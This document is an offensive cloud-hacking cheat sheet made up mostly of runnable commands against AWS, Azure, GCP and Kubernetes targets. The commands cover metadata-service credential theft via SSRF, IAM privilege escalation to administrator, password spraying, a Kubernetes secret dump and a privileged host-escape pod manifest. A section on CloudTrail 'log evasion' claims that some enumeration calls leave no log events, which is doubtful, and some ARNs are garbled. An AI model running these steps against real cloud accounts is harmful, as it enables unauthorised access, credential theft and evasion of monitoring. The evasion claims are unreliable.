# Cloud Hacking

> AWS, Azure, GCP attack techniques: misconfiguration abuse, IAM exploitation, container escapes.

---

## Cloud Attack Surface

```
Public exposure → Misconfig / open storage → Credential theft → IAM abuse
     ↓                                              ↓
SSRF → IMDSv1 metadata → credentials        Privilege escalation
     ↓
Lateral movement across cloud services → Data exfil / persistence
```

---

## AWS

### Reconnaissance
```bash
# Enumerate target's AWS footprint
subfinder -d target.com -silent | httpx -title | grep -i "s3\|aws\|amazon"

# S3 bucket discovery
aws s3 ls s3://target-bucket --no-sign-request
aws s3 sync s3://target-bucket . --no-sign-request

# Shodan / Censys for exposed S3
shodan search "hostname:s3.amazonaws.com title:target"

# Check bucket ACLs
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
```

### IMDSv1 SSRF: Credential Theft
```bash
# If SSRF exists on EC2 instance (IMDSv1, no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (token required: target must be vulnerable to full SSRF)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### IAM Enumeration & Escalation
```bash
# Who am I?
aws sts get-caller-identity

# Enumerate permissions (enumerate-iam)
git clone https://github.com/andresriancho/enumerate-iam && cd enumerate-iam
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# Common escalation paths
# 1. iam:CreatePolicyVersion → attach admin policy version
aws iam create-policy-version --policy-arn arn:aws:iam: ACCT:policy/target \
    --policy-document file://admin_policy.json --set-as-default

# 2. iam:AttachUserPolicy → attach AdministratorAccess to self
aws iam attach-user-policy --user-name target-user \
    --policy-arn arn:aws:iam: aws:policy/AdministratorAccess

# 3. iam:PassRole + ec2:RunInstances → launch EC2 with admin role
aws ec2 run-instances --image-id ami-xxxx --instance-type t2.micro \
    --iam-instance-profile Name=admin-role --user-data file://payload.sh
```

### Pacu: AWS Exploitation Framework
```bash
pip3 install pacu
pacu
  import_keys --profile compromised
  run iam__enum_users_roles_policies_groups
  run iam__privesc_scan
  run s3__bucket_finder
  run ec2__enum
  run lambda__enum
```

### CloudTrail / Log Evasion
```bash
# Check if CloudTrail is enabled
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name trail-name

# Low-noise enumeration (doesn't generate CloudTrail events)
aws iam get-account-authorization-details  # single call = lots of info
aws iam simulate-principal-policy          # test permissions without performing actions
```

---

## Azure

### Reconnaissance
```bash
# Enumerate Azure tenant
curl "https://login.microsoftonline.com/<tenant>.onmicrosoft.com/v2.0/.well-known/openid-configuration"

# o365spray: user enumeration + spraying
python3 o365spray.py --validate --domain target.com
python3 o365spray.py --enum -U users.txt --domain target.com
python3 o365spray.py --spray -U users.txt -p Password1 --domain target.com

# AADInternals
import-module AADInternals
Get-AADIntTenantDetails -Domain "target.com"
Invoke-AADIntUserEnumerationAsInsider -Users "admin@target.com"
```

### Azure SSRF → IMDS
```bash
# Azure IMDS (no token required in old instances)
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"
curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H "Metadata: true"
```

### ROADtools: Enumeration
```bash
pip install roadrecon
roadrecon auth -u user@target.com -p Password1
roadrecon gather
roadrecon gui    # web UI with all Azure objects
```

---

## GCP

### Reconnaissance
```bash
# GCS bucket discovery
gsutil ls gs://target-bucket
gsutil cat gs://target-bucket/sensitive_file.txt

# GCP IMDS
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     -H "Metadata-Flavor: Google"

# Enumerate with gcloud
gcloud projects list
gcloud iam service-accounts list
gcloud compute instances list
```

### IAM Enumeration
```bash
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts get-iam-policy SA_EMAIL
# Look for: roles/owner, roles/iam.securityAdmin, roles/editor
```

---

## Container / Kubernetes

### Container Escape
```bash
# Check if running in container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv

# Privileged container → host escape
mount /dev/sda1 /mnt && chroot /mnt

# Cap_SYS_ADMIN → mount host filesystem
unshare -m

# runc CVE-2019-5736 (Dirty runc)
# Write to /proc/self/exe while runc executes

# Kubernetes API from pod
curl -s https://kubernetes.default.svc/api -k \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

### Kubernetes RBAC Abuse
```bash
# Who can I be?
kubectl auth can-i --list

# Enumerate secrets (if allowed)
kubectl get secrets -A
kubectl get secret <name> -o yaml | base64 -d

# Create privileged pod for host escape
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata: { name: escape }
spec:
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--", "bash"]
    securityContext: { privileged: true }
EOF
```

---

## Tools

| Tool | Purpose |
|------|---------|
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) | AWS exploitation framework |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud security audit |
| [Prowler](https://github.com/prowler-cloud/prowler) | AWS/Azure/GCP security scanner |
| [CloudMapper](https://github.com/duo-labs/cloudmapper) | AWS network visualization |
| [enumerate-iam](https://github.com/andresriancho/enumerate-iam) | Brute-force IAM permissions |
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD enumeration |
| [AADInternals](https://aadinternals.com) | Azure AD / M365 attacks |
| [Trivy](https://github.com/aquasecurity/trivy) | Container/IaC vulnerability scan |
| [kube-bench](https://github.com/aquasecurity/kube-bench) | Kubernetes CIS benchmark |
| [CDK](https://github.com/cdk-team/CDK) | Container escape toolkit |
